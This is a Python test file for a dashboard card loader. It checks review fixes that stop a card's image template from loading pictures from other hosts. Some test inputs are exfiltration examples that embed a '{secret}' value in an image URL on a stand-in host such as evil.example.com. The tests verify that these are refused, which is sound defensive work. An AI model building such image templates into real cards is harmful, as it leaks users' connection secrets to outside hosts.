"""Corrections after the review of "every connection can be read by a card" (korrektur J1, F3 to F9).

A card can come from a shop, so none of this is left to the author: a picture does not lead off to another host with a value
of the connection in it, a refused request does not cost the built-in cards their session, and the memory of what is read is
bounded.
"""

from __future__ import annotations

from typing import Any

import pytest

from app.adapters import get_adapter
from app.adapters.custom import present
from app.cards import images, load, pipeline
from app.cards.load import CardInvalid

BASE = "http://svc.example.com:8080"

HEAD = """\
nexdeck-card: 1
slug: covers
name: Sample
version: "1.0.0"
requires: [sonarr]
requests:
  - id: queue
    path: /api/v3/queue
form: posters
rows: {select: records}
item:
  title: title
"""


def problems_of(image: str) -> list[Any]:
    with pytest.raises(CardInvalid) as invalid:
        load.load_definition(HEAD + image)
    return invalid.value.problems


# -- F3: a picture is a value of the answer or a path on the connection ------------------------------------


@pytest.mark.parametrize(
    "image",
    [
        "  image: {template: 'https://evil.example.com/p.png?d={secret}'}\n",
        "  image: {template: '{poster}'}\n",
        "  image: {template: '//evil.example.com/p.png'}\n",
        "  image: {template: 'http://svc.example.com:8080/p/{id}.jpg'}\n",
        "  image: {formula: '{poster} + 1'}\n",
    ],
)
def test_korrektur_f3_a_picture_made_from_a_template_or_a_formula_has_to_be_a_path_on_the_connection(image: str) -> None:
    found = problems_of(image)
    assert [one.code for one in found] == ["card_picture_address"]
    assert found[0].line == 13 and found[0].path.startswith("item.image"), "the problem sits on the line of the picture"


def test_korrektur_f3_a_path_and_a_template_that_starts_with_a_single_slash_are_fine() -> None:
    for image in ("  image: poster\n", "  image: {path: poster}\n", "  image: {template: '/MediaCover/{id}/poster.jpg'}\n"):
        load.load_definition(HEAD + image)


def present_unchecked(image: dict[str, Any], row: dict[str, Any]) -> Any:
    """A definition that did not pass the check (a card from before it, or one kept in the table), shown with a row."""
    data = {
        "nexdeck-card": 1, "slug": "covers", "name": "Sample", "version": "1.0.0", "requires": ["sonarr"],
        "requests": [{"id": "queue", "path": "/api/v3/queue"}], "form": "posters", "rows": {"select": "records"},
        "item": {"title": "title", "image": image},
    }
    definition = load.definition_from_data(data)
    return present(definition, pipeline.run(definition, {"queue": {"records": [row]}}), base=BASE)


def test_korrektur_f3_at_run_time_a_made_up_address_to_another_host_is_no_picture_and_a_named_one_is() -> None:
    row = {"title": "A", "secret": "SUPERSECRETKEY", "poster": "https://img.example.com/a.jpg"}
    made = present_unchecked({"template": "https://evil.example.com/p.png?d={secret}"}, row)
    assert "art" not in made.items[0], "an address put together by the card is not fetched from another host"
    named = present_unchecked({"path": "poster"}, row)
    assert images.external_address(named.items[0]["art"].removeprefix("proxy:")) == "https://img.example.com/a.jpg"
    local = present_unchecked({"template": "/MediaCover/{title}/p.jpg"}, row)
    assert images.connection_path(local.items[0]["art"].removeprefix("proxy:"), BASE) == "/MediaCover/A/p.jpg"


def test_korrektur_f3_the_reference_refuses_a_foreign_address_unless_the_answer_named_it_whole() -> None:
    assert images.reference("https://img.example.com/a.jpg", BASE, named=False) == ""
    assert images.reference("https://img.example.com/a.jpg", BASE, named=True).startswith(f"proxy:{images.EXTERNAL}?")
    assert images.reference(f"{BASE}/p/a.jpg", BASE, named=False).startswith(f"proxy:{images.CONNECTION}?")
    assert get_adapter("sonarr").raw_access
